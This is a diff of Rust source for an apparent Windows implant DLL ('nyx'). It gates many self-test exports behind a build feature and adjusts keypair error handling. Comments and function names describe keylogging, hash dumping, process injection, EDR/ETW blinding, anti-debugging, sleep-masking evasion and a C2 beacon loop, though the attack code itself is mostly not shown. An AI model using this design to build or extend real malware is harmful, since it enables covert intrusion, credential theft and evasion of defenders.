@@ -50,6 +50,7 @@ fn ensure_rt() -> Option<&'static crate::syscalls::Runtime> {
 /// Tests: write a temp file, read it back, rename, copy, mkdir, rm. Each
 /// sub-check sets a bit. Bits: 0=upload, 1=download-equals, 2=mv, 3=cp,
 /// 4=mkdir, 5=rm, 6=runtime-up.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_fs() {
     let mut mask: u32 = 0;
@@ -164,6 +165,7 @@ pub unsafe extern "system" fn nyx_selftest_fs() {
 
 /// Runs `echo nyx-shell-selftest` and checks the captured output contains the
 /// marker. Bits: 0=output-contains-marker.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_shell() {
     let mut mask: u32 = 0;
@@ -183,6 +185,7 @@ pub unsafe extern "system" fn nyx_selftest_shell() {
 
 /// Captures the primary screen and checks the BMP is well-formed (magic "BM",
 /// non-trivial size). Bits: 0=got-FileChunk(s), 1=bmp-magic, 2=size-reasonable.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_screenshot() {
     let mut mask: u32 = 0;
@@ -229,6 +232,7 @@ pub unsafe extern "system" fn nyx_selftest_screenshot() {
 ///   bit6 = BitBlt returned nonzero
 ///   bit7 = GetDIBits returned nonzero
 /// Exits at the first failing step so a crash/zero narrows the cause.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_screenshot_diag() {
     use core::ffi::c_void;
@@ -369,6 +373,7 @@ pub unsafe extern "system" fn nyx_selftest_screenshot_diag() {
 // ============================================================================
 
 /// Bits: 0=driveinfo-nonempty, 1=env-PATH-set, 2=net-interfaces-nonempty.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_recon() {
     let mut mask: u32 = 0;
@@ -397,6 +402,7 @@ pub unsafe extern "system" fn nyx_selftest_recon() {
 
 /// Start, poll once (no keys likely pressed deterministically, so we only check
 /// the plumbing), then dump. Bits: 0=start-Ok, 1=dump-is-Output.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_keylog() {
     let mut mask: u32 = 0;
@@ -418,6 +424,7 @@ pub unsafe extern "system" fn nyx_selftest_keylog() {
 /// On a non-debugged host both should be false. Bits: 0=is_debugged-returned-
 /// false, 1=uptime>0, 2=runtime-queried-without-panic (implicit — reaching the
 /// exit proves it).
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_antidebug() {
     let mut mask: u32 = 0;
@@ -445,6 +452,7 @@ pub unsafe extern "system" fn nyx_selftest_antidebug() {
 //       3 = NtTraceEvent was resolvable (export present in ntdll).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
     let mut mask: u32 = 0;
@@ -487,6 +495,7 @@ pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
 //       3 = process terminated cleanly (reached the exit).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_inject() {
     let mut mask: u32 = 0;
@@ -533,6 +542,7 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 // regardless of NYX_POOL_PARTY_ON build-time default.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_inject_pool() {
     let mut mask: u32 = 0;
@@ -594,6 +604,7 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
 }
 
 /// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hostinfo() {
     let mut mask: u32 = 0;
@@ -623,6 +634,7 @@ pub unsafe extern "system" fn nyx_selftest_hostinfo() {
 
 /// Bits: 0=closed-port-is-Err (the connect machinery ran and correctly reported
 /// failure — proves the winsock resolve/socket/select/SO_ERROR chain works).
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_pivot() {
     let mut mask: u32 = 0;
@@ -650,6 +662,7 @@ pub unsafe extern "system" fn nyx_selftest_pivot() {
 /// which calls BeaconPrintf(CALLBACK_OUTPUT, "BOF-PRINT-OK %d\n", 42)).
 /// Exercises the full COFF loader: parse → W^X map → reloc → resolve the
 /// BeaconPrintf shim → call `go` → capture output.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_bof() {
     let mut mask: u32 = 0;
@@ -669,6 +682,7 @@ pub unsafe extern "system" fn nyx_selftest_bof() {
 /// addr to markers, so we can see if the mapping/reloc produced valid addrs.
 /// (If this completes without segfault, the mapping is fine and the crash is
 /// inside go()'s execution; if it segfaults, the mapping/reloc itself is bad.)
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_bof_diag() {
     let blob: &[u8] = include_bytes!("../tests/fixtures/bof_print.o");
@@ -699,6 +713,7 @@ pub unsafe extern "system" fn nyx_selftest_bof_diag() {
 /// call). bit0 = loader ran `go` without crashing (reached the exit). If this
 /// passes but nyx_selftest_bof segfaults, the bug is in the BeaconPrintf shim;
 /// if BOTH crash, the bug is in the W^X loader/mapping itself.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_bof_marker() {
     let blob: &[u8] = include_bytes!("../tests/fixtures/bof_marker.o");
@@ -714,6 +729,7 @@ pub unsafe extern "system" fn nyx_selftest_bof_marker() {
 // the open/read of a locked hive is the culprit. Exits 1 if it returned at all.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hashdump_diag() {
     let rt = ensure_rt().unwrap();
@@ -728,6 +744,7 @@ pub unsafe extern "system" fn nyx_selftest_hashdump_diag() {
 // propagation works and the bitmasks above are reliable. (Some rundll32 builds
 // mask/translate ExitProcess codes; this confirms whether ours does.)
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_calib42() {
     unsafe { exit(42) };
@@ -740,6 +757,7 @@ pub unsafe extern "system" fn nyx_selftest_calib42() {
 ///   0xA2 = session_key (HKDF) OK
 ///   0xAF = csprng_fill returned false
 ///   0xAE = fill returned all-zeros
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_csprng() {
     use nyx_protocol::{ImplantKeypair, crypto};
@@ -756,8 +774,11 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     // 0xA0 reached: CSPRNG OK
 
     // Step 2: Test X25519 keygen (the curve25519 scalar mult).
-    let kp = ImplantKeypair::generate();
-    let _pub = kp.public_bytes();
+    let kp = match ImplantKeypair::generate() {
+        Ok(k) => k,
+        Err(nyx_protocol::GenerateError::CsprngFailed) => unsafe { exit(0xAF) },
+        Err(nyx_protocol::GenerateError::ZeroScalar) => unsafe { exit(0xAE) },
+    };
     // 0xA1 reached: keygen OK
 
     // Step 3: Test session_key (HKDF + ECDH with a dummy pubkey).
@@ -787,6 +808,7 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
 
 /// Diagnostic: test the beacon_loop path incrementally.
 /// 0xB0=config+keygen+check-in OK, 0xB1=first sleep OK, 0xB2=second POST OK.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     use nyx_protocol::crypto;
@@ -794,7 +816,10 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     let _ = crypto::register_csprng(crate::entry::csprng_fill);
     let (cfg, config_plain) = crate::config::load();
     crate::mem::register_owned(config_plain);
-    let kp = nyx_protocol::ImplantKeypair::generate();
+    let kp = match nyx_protocol::ImplantKeypair::generate() {
+        Ok(k) => k,
+        Err(_) => unsafe { exit(0xAF) },
+    };
     let key = kp.session_key(&cfg.server_pub);
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
@@ -889,6 +914,7 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
 // Invoke: rundll32 nyx_implant_win.dll,nyx_linger  (then scan its PID).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_linger() {
     // Bring up the full evasion runtime: indirect-syscall table + RX trampoline
@@ -928,6 +954,7 @@ pub unsafe extern "system" fn nyx_linger() {
 // Invoke: rundll32 nyx_implant_win.dll,nyx_linger_foliage  (then scan its PID).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_linger_foliage() {
     // Same runtime bring-up as nyx_linger.
@@ -965,6 +992,7 @@ pub unsafe extern "system" fn nyx_linger_foliage() {
 // Marker: %TEMP%\nyx_etwti_status.txt with "code=<hex> status=<signed-dec>" per line.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_blind_provider() {
     let mut mask: u32 = 0;
@@ -1027,6 +1055,7 @@ pub unsafe extern "system" fn nyx_selftest_blind_provider() {
 // the sacrificial notepad MAY still be flagged/killed — we report that honestly.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_inject_armed() {
     let mut mask: u32 = 0;
@@ -1085,6 +1114,7 @@ pub unsafe extern "system" fn nyx_selftest_inject_armed() {
 // Bits: 0 = 135 reports open, 1 = 1 reports closed, 2 = output non-empty.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_portscan() {
     let mut mask: u32 = 0;
@@ -1107,6 +1137,7 @@ pub unsafe extern "system" fn nyx_selftest_portscan() {
 // Bits: 0 = routes, 1 = arp, 2 = connections, 3 = unknown-query is Err.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_net() {
     let mut mask: u32 = 0;
@@ -1138,6 +1169,7 @@ pub unsafe extern "system" fn nyx_selftest_net() {
 // sane Response without crashing. Bit 0 = ran-sane (Output or Err, not panic).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_clipboard() {
     let mut mask: u32 = 0;
@@ -1154,6 +1186,7 @@ pub unsafe extern "system" fn nyx_selftest_clipboard() {
 // Bits: 0 = dump-all non-empty, 1 = unset var is Err.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_env() {
     let mut mask: u32 = 0;
@@ -1177,6 +1210,7 @@ pub unsafe extern "system" fn nyx_selftest_env() {
 // crash. Bits: 0 = method-0 is Err, 1 = method-1 is Err, 2 = bad-method is Err.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hashdump() {
     let mut mask: u32 = 0;
@@ -1208,6 +1242,7 @@ pub unsafe extern "system" fn nyx_selftest_hashdump() {
 // true after steal.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_postex() {
     let mut mask: u32 = 0;
@@ -1235,6 +1270,7 @@ pub unsafe extern "system" fn nyx_selftest_postex() {
 // Bits: 0 = >= 3 frames worth of chunks, 1 = at least one valid BMP magic.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_screenwatch() {
     let mut mask: u32 = 0;
@@ -1277,6 +1313,7 @@ pub unsafe extern "system" fn nyx_selftest_screenwatch() {
 // Bits: 0 = decode succeeds, 1 = fields match.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_config() {
     let mut mask: u32 = 0;
@@ -1316,6 +1353,7 @@ pub unsafe extern "system" fn nyx_selftest_config() {
 //       3=large-file round-trip.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_fs_edge() {
     let mut mask: u32 = 0;
@@ -1710,6 +1748,7 @@ unsafe fn nt_create_file_via_export_stack() -> i32 {
 /// non-empty dir? Uses C:\Windows\Temp\nyx_rm_probe (a plain path, not a
 /// session-Temp reparse point). If this works but fs's rm-dir fails, the issue
 /// is the %TEMP%\2 reparse-point path, not the rm logic.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_rm_probe() {
     // Pre-create the dir + a child via cmd (so we control the setup).
@@ -1738,6 +1777,7 @@ pub unsafe extern "system" fn nyx_selftest_rm_probe() {
 
 /// Isolated rm-file test: create a file via SHELL (not NT syscall), then rm it
 /// via NT path. Isolates whether rm itself works when no prior NT syscall ran.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_rm_file() {
     let rt = ensure_rt().unwrap();
@@ -1754,6 +1794,7 @@ pub unsafe extern "system" fn nyx_selftest_rm_file() {
     unsafe { exit(if rm_ok { 1 } else { 0 }) };
 }
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_fs_probe() {
     let rt = ensure_rt().unwrap();
@@ -1970,6 +2011,7 @@ fn hex_u32(mut v: u32) -> String {
 /// kernel32 file I/O? Writes a marker via WriteFile AFTER ensure_rt(). If the
 /// marker is missing, the RT init broke the process; if present, the RT is
 /// fine and the fs failure is in the syscall trampoline itself.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_rt_probe() {
     use core::ffi::c_void;
@@ -2062,6 +2104,7 @@ pub unsafe extern "system" fn nyx_selftest_rt_probe() {
     unsafe { exit(if wok != 0 { 0xA7 } else { 0xA8 }) };
 }
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_alloc_probe() {
     let mut mask: u32 = 0;
@@ -2158,6 +2201,7 @@ pub unsafe extern "system" fn nyx_selftest_alloc_probe() {
 // didn't hang/crash (exit reached).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_shell_edge() {
     let mut mask: u32 = 0;
@@ -2181,6 +2225,7 @@ pub unsafe extern "system" fn nyx_selftest_shell_edge() {
 // Bits: 0 = NtDelayExecution via indirect runtime returned success (0).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_syscall_rt() {
     let mut mask: u32 = 0;
@@ -2208,6 +2253,7 @@ pub unsafe extern "system" fn nyx_selftest_syscall_rt() {
 /// Run `LivePdataScanner::scan()` against the REAL process modules and check
 /// the returned `GapPool` is non-empty. Writes a marker (`nyx_gap_pool.txt`)
 /// with the per-bucket counts so an external check can corroborate the bitmask.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_gap_scan() {
     let mut mask: u32 = 0;
@@ -2272,6 +2318,7 @@ pub unsafe extern "system" fn nyx_selftest_gap_scan() {
 // guard + seed derivation don't crash). Bits: 0 = mask+unmask both ran.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_mem() {
     let mut mask: u32 = 0;
@@ -2304,6 +2351,7 @@ pub unsafe extern "system" fn nyx_selftest_mem() {
 // Bits: 0 = post_frame to a dead port returns None (no crash/panic).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_transport() {
     let mut mask: u32 = 0;
@@ -2362,6 +2410,7 @@ fn join(base: &str, suffix: &str) -> String {
 // encrypted we'd never reach the exit).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_foliage() {
     let mut mask: u32 = 0;
@@ -2390,6 +2439,7 @@ pub unsafe extern "system" fn nyx_selftest_foliage() {
 // the CONTEXT/APC/timing needs single-stepping in a target VM.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     let mut mask: u32 = 0;
@@ -2423,6 +2473,7 @@ pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
 // gaps staged (gap pool non-empty on this host).
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_swap_decision() {
     let mut mask: u32 = 0;
@@ -2451,6 +2502,7 @@ pub unsafe extern "system" fn nyx_selftest_swap_decision() {
 // seam, see stack.rs module docs). bit0 still proves the asm doesn't crash.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_swap_armed() {
     let mut mask: u32 = 0;
@@ -2702,6 +2754,7 @@ unsafe fn diag_test_ctx_thread() {
     diag_byte(b'm');
 }
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
     crate::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest
@@ -2747,6 +2800,7 @@ pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
 /// Minimal no-op VEH handler — returns EXCEPTION_CONTINUE_SEARCH for every
 /// exception. Used by the forwarded-export regression test to register a VEH
 /// without depending on the HWBP handler.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn noop_veh_handler(_ep: usize) -> i32 {
     0 // EXCEPTION_CONTINUE_SEARCH
@@ -2772,6 +2826,7 @@ pub unsafe extern "system" fn noop_veh_handler(_ep: usize) -> i32 {
 ///   bit1 = `Sleep` resolved + called
 ///   bit2 = `AddVectoredExceptionHandler` resolved + called + removed
 /// Expect 0b111 = 7.
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
     let mut mask: u32 = 0;
@@ -2837,6 +2892,7 @@ pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
 //   bit3 = ghost chain built (>= 4 frames)
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_lacuna() {
     let mut mask: u32 = 0;
@@ -2878,6 +2934,7 @@ pub unsafe extern "system" fn nyx_selftest_lacuna() {
 //   bit2 = Fluctuation sleep completed with preserved unwind
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_insomniac() {
     let mut mask: u32 = 0;
